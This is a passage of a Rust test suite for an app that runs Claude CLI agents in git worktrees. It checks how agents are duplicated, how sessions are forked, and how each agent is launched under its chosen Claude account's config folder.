    assert_eq!(copy.append_prompt.as_deref(), Some(moved.as_str()));
    h.core.ensure_process(&copy.id).await.unwrap();
    let argv = h.launches(&cdir).pop().unwrap();
    assert!(
        argv.windows(2)
            .any(|w| w[0] == "--append-system-prompt" && w[1] == moved),
        "{argv:?}"
    );
    h.turn(&copy.id, "Bonjour").await;
    assert!(h
        .items(&copy.id)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
    // The original is untouched: its branch, its changes.
    assert_eq!(git(&dir, &["rev-parse", "HEAD"]), head);
    assert!(dir.join("brouillon.txt").exists());

    // Everything committed: a second copy, with nothing to say of it.
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-qm", "suite"]);
    let second = h.core.duplicate_agent(&a.id).await.unwrap().meta;
    assert_eq!(second.name, "agent-1 (copie 2)");
    assert_eq!(second.worktree.unwrap().branch, "escouade/agent-1-copie-2");
    assert!(
        !h.items(&second.id)
            .iter()
            .any(|i| i["text"] == uncommitted_notice("agent-1")),
        "{:?}",
        h.items(&second.id)
    );
}

#[tokio::test]
async fn an_agent_is_not_copied_during_its_turn() {
    let h = harness("copy-turn");
    let (p, r) = h.project(true).await;
    let worktrees = || git(&r, &["worktree", "list"]).lines().count();
    for (name, message, status) in [
        ("lent", "slow", AgentStatus::Running),
        ("curieux", "question", AgentStatus::Waiting),
    ] {
        let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
        h.core.rename_agent(&id, name).await.unwrap();
        h.core
            .send_message(&id, message.into(), vec![])
            .await
            .unwrap();
        h.wait("the turn", |h| h.agent(&id).status == status).await;
        let (agents, made) = (h.core.agents.read().len(), worktrees());
        let e = h.core.duplicate_agent(&id).await.unwrap_err();
        assert_eq!(
            e.to_string(),
            format!("Attends la fin du tour de {name} pour le dupliquer.")
        );
        assert_eq!((h.core.agents.read().len(), worktrees()), (agents, made));
    }
}

#[tokio::test]
async fn a_ticket_agent_is_copied_as_an_ordinary_agent() {
    let h = harness("copy-ticket");
    let (p, _) = h.project(false).await;
    let a = h
        .core
        .create_agent_with(
            &p.id,
            AgentOptions {
                name: Some("dem-1-ajouter".into()),
                worktree: Some(("ticket/dem-1".into(), "main".into())),
                append_prompt: Some("Protocole".into()),
                ticket_id: Some("t1".into()),
                port_base: Some(4100),
                ..Default::default()
            },
        )
        .await
        .unwrap()
        .meta;
    let copy = h.core.duplicate_agent(&a.id).await.unwrap().meta;
    assert_eq!(copy.name, "dem-1-ajouter (copie)");
    assert_eq!((copy.ticket_id.as_deref(), copy.port_base), (None, None));
    // Its own worktree from the ticket's branch, whose base it keeps.
    let wt = copy.worktree.unwrap();
    assert_eq!(
        (wt.branch.as_str(), wt.base_branch.as_str()),
        ("escouade/dem-1-ajouter-copie", "main")
    );
    // No ticket's protocol at its start: only what it is told of its new folder.
    h.core.ensure_process(&copy.id).await.unwrap();
    let argv = h.launches(Path::new(&wt.path)).pop().unwrap();
    let i = argv
        .iter()
        .position(|x| x == "--append-system-prompt")
        .unwrap();
    assert!(
        argv[i + 1].starts_with("Cette conversation a été copiée depuis un agent"),
        "{argv:?}"
    );
    assert!(!argv.iter().any(|x| x.contains("Protocole")), "{argv:?}");
    // The ticket's agent is still the original.
    assert_eq!(h.agent(&a.id).ticket_id.as_deref(), Some("t1"));
}

#[tokio::test]
async fn a_copy_of_a_copy_that_ran_no_turn_forks_where_the_first_was_made() {
    let h = harness("copy-of-copy");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.rename_agent(&id, "source").await.unwrap();
    h.turn(&id, "Premier").await;
    let original = h.agent(&id);
    let (session, entry) = (original.session_id.unwrap(), original.last_entry.unwrap());
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta.id;
    // The original goes on, the copy has run no turn: it has no session of its own yet.
    h.turn(&id, "Ensuite").await;
    let second = h.core.duplicate_agent(&copy).await.unwrap().meta;
    assert_eq!(second.name, "source (copie) (copie)");
    assert_eq!(
        (second.fork_of.as_deref(), second.fork_at.as_deref()),
        (Some(session.as_str()), Some(entry.as_str()))
    );
    assert_eq!(h.items(&second.id), h.items(&copy));
    h.core.ensure_process(&second.id).await.unwrap();
    let argv = h.launches(&r).pop().unwrap();
    assert!(
        argv.windows(3).any(|w| w
            == [
                format!("--resume={session}"),
                "--fork-session".to_string(),
                format!("--resume-session-at={entry}")
            ]),
        "{argv:?}"
    );
}

#[tokio::test]
async fn a_copy_whose_fork_point_is_not_in_the_session_forks_all_of_it() {
    let h = harness("copy-unpinned");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.rename_agent(&id, "source").await.unwrap();
    h.turn(&id, "Premier").await;
    let session = h.agent(&id).session_id.unwrap();
    h.core.agent(&id).unwrap().lock().meta.last_entry = Some("missing-e1".into());
    let before = h.launches(&r).len();
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta.id;
    // Its start refused, it is started again at once, on the whole session.
    h.wait("a second start", |h| h.launches(&r).len() == before + 2)
        .await;
    let launches = h.launches(&r);
    let [.., refused, forked] = &launches[..] else {
        panic!("{launches:?}")
    };
    assert!(
        refused.contains(&"--resume-session-at=missing-e1".to_string()),
        "{refused:?}"
    );
    assert!(
        forked
            .windows(2)
            .any(|w| w[0] == format!("--resume={session}") && w[1] == "--fork-session")
            && !forked.iter().any(|x| x.starts_with("--resume-session-at")),
        "{forked:?}"
    );
    // Its message goes to that process.
    h.turn(&copy, "Bonjour").await;
    assert_eq!(h.launches(&r).len(), before + 2);
    assert!(h
        .items(&copy)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
    assert!(h
        .notices(&copy, "warn")
        .iter()
        .any(|n| n.starts_with("Point de copie introuvable")));
    assert_eq!(h.agent(&copy).fork_of, None);
}

#[tokio::test]
async fn a_copy_whose_original_session_is_gone_starts_a_new_one() {
    let h = harness("copy-lost");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.rename_agent(&id, "perdu").await.unwrap();
    h.core.agent(&id).unwrap().lock().meta.session_id = Some("missing-1".into());
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta.id;
    h.turn(&copy, "Bonjour").await;
    let meta = h.agent(&copy);
    assert_eq!(meta.fork_of, None);
    assert!(
        meta.session_id
            .as_deref()
            .is_some_and(|s| s.starts_with("sess-")),
        "{:?}",
        meta.session_id
    );
    assert!(h
        .items(&copy)
        .iter()
        .any(|i| i["text"] == "Bonjour, tu as dit : Bonjour"));
}

#[tokio::test]
async fn a_long_conversation_is_copied_whole_in_one_append_per_item() {
    let h = harness("copy-long");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    // 2 000 messages, each logged as it was streamed: an append, then the patch of its text.
    let dir = h.core.data.conversations();
    let mut log = String::new();
    for i in 0..2000 {
        for op in [
            json!({ "op": "append", "item": { "kind": "text", "id": format!("m{i}"), "text": "", "streaming": true } }),
            json!({ "op": "patch", "id": format!("m{i}"), "patch": { "text": format!("réponse {i}"), "streaming": false } }),
        ] {
            log.push_str(&op.to_string());
            log.push('\n');
        }
    }
    std::fs::write(crate::conv::log_path(&dir, &id), log).unwrap();
    // Read from its log, as after a restart.
    h.core.agent(&id).unwrap().lock().conv = crate::conv::Conv::new(&dir, &id);
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta.id;
    let copied = crate::conv::replay(&crate::conv::log_path(&dir, &copy)).unwrap();
    assert_eq!((copied.items.len(), copied.ops), (2000, 2000));
    assert_eq!(copied.items[1999]["text"], "réponse 1999");
    assert_eq!(h.items(&copy), h.items(&id));
}

#[tokio::test]
async fn no_copy_is_made_when_its_worktree_cannot_be() {
    let h = harness("copy-no-worktree");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap().meta;
    // Its worktree's folder is gone: no commit to start the copy's from.
    let gone = h.dir.join("gone").to_string_lossy().to_string();
    if let Some(wt) = h.core.agent(&a.id).unwrap().lock().meta.worktree.as_mut() {
        wt.path = gone;
    }
    let logs = || {
        std::fs::read_dir(h.core.data.conversations())
            .unwrap()
            .count()
    };
    let (agents, before) = (h.core.agents.read().len(), logs());
    assert!(h.core.duplicate_agent(&a.id).await.is_err());
    // Neither an agent nor its conversation left behind.
    assert_eq!((h.core.agents.read().len(), logs()), (agents, before));
}

// ---------- Claude accounts ----------

/// A second Claude account, its folder in the test's, put after Principal in the settings.
fn second_account(h: &Harness) -> Account {
    let pro = Account {
        id: "pro".into(),
        name: "Pro".into(),
        config_dir: h.dir.join("claude-pro").to_string_lossy().into(),
        ..Default::default()
    };
    let mut s = h.core.settings.read().clone();
    s.accounts.push(pro.clone());
    h.core.save_settings(s).unwrap();
    pro
}

async fn agent_on(h: &Harness, project: &Project, account: &str) -> AgentMeta {
    h.core
        .create_agent_with(
            &project.id,
            AgentOptions {
                account: Some(account.into()),
                ..Default::default()
            },
        )
        .await
        .unwrap()
        .meta
}

/// The `CLAUDE_CONFIG_DIR` of each launch of the fake CLI in `cwd`, in order (null: none).
fn config_dirs(h: &Harness, cwd: &Path) -> Vec<Value> {
    h.launch_log(cwd)
        .iter()
        .map(|l| l["configDir"].clone())
        .collect()
}

/// The one-shot questions (`claude -p`, asked in the temporary folder) launched so far with
/// `config_dir` as their `CLAUDE_CONFIG_DIR`. Other tests ask theirs there too, each with its
/// own folder or none.
fn one_shots_with(config_dir: &str) -> usize {
    let tmp = std::env::temp_dir();
    // As the process started there reports it (macOS: /private/var, not /var).
    let tmp = if cfg!(windows) {
        tmp
    } else {
        tmp.canonicalize().unwrap()
    };
    let key: String = tmp
        .to_string_lossy()
        .trim_end_matches(['\\', '/'])
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .collect();
    let file = std::env::temp_dir().join(format!("fake-claude-{key}.jsonl"));
    std::fs::read_to_string(file)
        .unwrap_or_default()
        .lines()
        // A line another test's CLI is writing may be cut.
        .filter_map(|l| serde_json::from_str::<Value>(l).ok())
        .filter(|l| {
            l["configDir"] == config_dir
                && l["argv"]
                    .as_array()
                    .is_some_and(|a| a.contains(&json!("-p")))
        })
        .count()
}

#[tokio::test]
async fn settings_and_agents_saved_before_the_accounts_load_on_principal() {
    let dir = test_dir("accounts-old-files");
    let data = DataDir::new(dir.join("data"));
    data.ensure().unwrap();
    std::fs::write(data.settings_file(), r#"{"claudePath":"","sound":false}"#).unwrap();
    let agent = json!({ "id": "a1", "projectId": "p1", "name": "ancien", "model": "sonnet",
                        "effort": "medium", "mode": "auto", "cwd": dir.to_string_lossy(),
                        "sessionId": "s1" });
    std::fs::write(
        data.state_file(),
        json!({ "projects": [], "agents": [agent] }).to_string(),
    )
    .unwrap();
    let app = mock_app();
    let (core, _rx) = Core::load(app.handle().clone(), data);
    assert_eq!(
        core.settings.read().accounts,
        vec![Account {
            id: "principal".into(),
            name: "Principal".into(),
            config_dir: String::new(),
            claude_path: String::new(),
            active: true,
        }]
    );
    assert_eq!(core.agent("a1").unwrap().lock().meta.account, "principal");
    // Saved without Principal (a window that lost it): it is put back, first, in the file too.
    let pro = Account {
        id: "pro".into(),
        name: "Pro".into(),
        config_dir: dir.join("pro").to_string_lossy().into(),
        ..Default::default()
    };
    let s = Settings {
        accounts: vec![pro],
        ..core.settings.read().clone()
    };
    core.save_settings(s).unwrap();
    let ids = |accounts: &[Account]| accounts.iter().map(|a| a.id.clone()).collect::<Vec<_>>();
    assert_eq!(ids(&core.settings.read().accounts), ["principal", "pro"]);
    let saved: Settings =
        serde_json::from_slice(&std::fs::read(core.data.settings_file()).unwrap()).unwrap();
    assert_eq!(ids(&saved.accounts), ["principal", "pro"]);
}

#[tokio::test]
async fn an_agent_on_a_second_account_runs_with_its_folder_and_one_on_principal_without() {
    let h = harness("accounts-launch");
    // Each agent in its worktree: each its own log of launches.
    let (p, r) = h.project(true).await;
    let pro = second_account(&h);
    let principal = h.core.create_agent(&p.id, None).await.unwrap().meta;
    assert_eq!(principal.account, "principal");
    h.turn(&principal.id, "Bonjour").await;
    assert_eq!(config_dirs(&h, Path::new(&principal.cwd)), [Value::Null]);
    let asked_before = one_shots_with(&pro.config_dir);
    let a = agent_on(&h, &p, "pro").await;
    assert_eq!(a.account, "pro");
    h.turn(&a.id, "Bonjour").await;
    assert_eq!(config_dirs(&h, Path::new(&a.cwd)), [json!(pro.config_dir)]);
    // Its name is asked of its account too.
    h.wait("its name", |h| h.agent(&a.id).named).await;
    assert_eq!(one_shots_with(&pro.config_dir), asked_before + 1);
    // So is the message of a direct commit of its changes.
    std::fs::write(
        Path::new(&a.cwd).join("src").join("app.ts"),
        "const a = 2;\n",
    )
    .unwrap();
    h.core
        .commit_propose(&p.id, Some(a.id.clone()), vec!["src/app.ts".into()])
        .await
        .unwrap();
    assert_eq!(one_shots_with(&pro.config_dir), asked_before + 2);
    // A question about no agent goes to Principal (here, the worktree commands read in the project).
    h.core.suggest_worktree_steps(&p.id).await.unwrap();
    assert_eq!(config_dirs(&h, &r).last(), Some(&Value::Null));
    // An account the settings do not know: Principal.
    let lost = agent_on(&h, &p, "parti").await;
    assert_eq!(lost.account, "principal");
}

#[tokio::test]
async fn an_agent_resumes_its_session_on_its_account_after_its_process_restarts() {
    let h = harness("accounts-resume");
    let (p, r) = h.project(false).await;
    let pro = second_account(&h);
    let id = agent_on(&h, &p, "pro").await.id;
    h.turn(&id, "Premier").await;
    let session = h.agent(&id).session_id.unwrap();
    // Idle-stopped, say: the next message starts it again.
    let old = h.core.agent(&id).unwrap().lock().detach().unwrap();
    old.close_input();
    h.turn(&id, "Second").await;
    let last = h.launch_log(&r).last().cloned().unwrap();
    assert_eq!(last["configDir"], json!(pro.config_dir));
    assert!(last["argv"]
        .as_array()
        .unwrap()
        .contains(&json!(format!("--resume={session}"))));
    // Found in its account's folder: the same session goes on.
    assert_eq!(h.agent(&id).session_id, Some(session));
    assert!(
        h.error_notices(&id).is_empty(),
        "{:?}",
        h.error_notices(&id)
    );
    // A copy forks that session: on the same account, where it is kept.
    let copy = h.core.duplicate_agent(&id).await.unwrap().meta;
    assert_eq!(copy.account, "pro");
    // And after the app's restart, the agent is still on it.
    h.core.save_now();
    let app = mock_app();
    let (reloaded, _rx) = Core::load(app.handle().clone(), h.core.data.clone());
    assert_eq!(reloaded.agent(&id).unwrap().lock().meta.account, "pro");
    assert_eq!(reloaded.settings.read().accounts[1], pro);
}
